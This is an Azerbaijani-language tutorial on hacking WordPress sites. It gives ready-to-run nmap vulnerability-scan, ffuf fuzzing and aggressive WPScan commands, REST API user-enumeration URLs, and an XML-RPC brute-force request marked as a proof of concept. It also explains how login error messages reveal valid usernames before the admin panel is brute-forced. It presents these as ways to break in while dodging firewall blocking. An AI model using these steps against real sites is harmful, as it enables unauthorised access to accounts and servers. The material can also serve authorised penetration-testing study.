**WordPress-i Həkk Etməyə Hakim Olmaq – Bütün Texnikalar və Alətlər**

**1. Saytın WordPress olduğunu necə müəyyənləşdirmək olar:**

* `http://target.com` ünvanına daxil olaraq kök (root) qovluğuna `/license.txt` əlavə etsək, WordPress istifadə olunduğunu görə bilərik.

* Saytın səhifə mənbə kodunda “wordpress” sözünü axtarsaq, həm WordPress-in istifadə olunduğunu, həm də versiyasını müəyyən edə bilərik.

* Firefox üçün olan **Wappalyzer** əlavəsini yükləyib hədəf sayta daxil olduqda, saytın WordPress olduğunu, hansı versiyada işlədiyini, hansı WAF-dan istifadə etdiyini və s. kimi məlumatları görə bilərik.

**2. Wappalyzer**

Saytda WAF (Web Application Firewall) olub-olmadığını, WordPress versiyasını və digər önəmli məlumatları müəyyən etməyə kömək edir.

**3. Portların skan edilməsi (Port Scan):**

* `nmap` vasitəsilə port skan edirik. Aşağıdakı əmrlə əgər zəiflik mövcuddursa, `nmap` özü avtomatik olaraq açıq portun versiyasına uyğun CVE və Exploit linklərini göstərir:

```
nmap -sS -sV -O -p- --min-rate 1000 -T4 --script "default,vuln" -oA fullscan target.com
```

**4. Qovluqların Axtarışı (Directories Fuzzing):**

```
ffuf -w directory-wordlist.txt -u http://target.com/FUZZ -mc 200
```

**5. İstifadəçilərin Əldə Edilməsi (Users Enumeration – Manual):**

```
http://target.com/?rest_route=/wp/v2/users
http://target.com/wp-json/wp/v2/users
```

Bu iki endpoint-i URL-də test edərək əgər REST API aktivdirsə, saytın admini və istifadəçiləri haqqında məlumat toplaya bilərsiniz. Bu, bruteforce zamanı istifadəçi adını tapmaqda kömək edir :)

**6. XMLRPC Yoxlaması və Brute Force:**

Əgər sitedə `xmlrpc` aktivdirsə (bunu `/xmlrpc.php` endpoint-i ilə müəyyən etmək olar), bu zaman çox sürətli bruteforce etmək mümkündür və WAF tərəfindən bloklanmaq ehtimalı azalır :)

**POC (Nümunə):**

```
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 250

<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>admin</string></value></param>
    <param><value><string>password123</string></value></param>
  </params>
</methodCall>
```

**7. WPScan ilə Aqressiv Skan:**

```
wpscan --url http://target.com -e at -e ap --api-token=<api_token> --plugins-detection aggressive --force
```

Buradan çıxan zəifliklərə uyğun CVE-ləri taparaq exploit yaza və ya mövcud exploit-lərlə istismar edə bilərsiniz.

**8. WordPress Admin Girişi**

WordPress admin login səhifəsinə daxil olduqda ilk olaraq istifadəçi adı – `test`, parol – `test` formatında yoxlayırıq. Əgər sistem “test” adlı istifadəçi qeydiyyatdan keçməyib deyə bir xəta verirsə, deməli bu istifadəçi yoxdur. Daha sonra `user enumeration` yolu ilə tapdığımız istifadəçi adlarını burada yoxlayırıq. Əgər məsələn `webadmin` istifadəçi adı üçün “şifrə yanlışdır” mesajı verirsə, deməli `webadmin` adlı istifadəçi mövcuddur və geridə qalan tək şey admin panelə bruteforce ilə daxil olmaqdır ;)
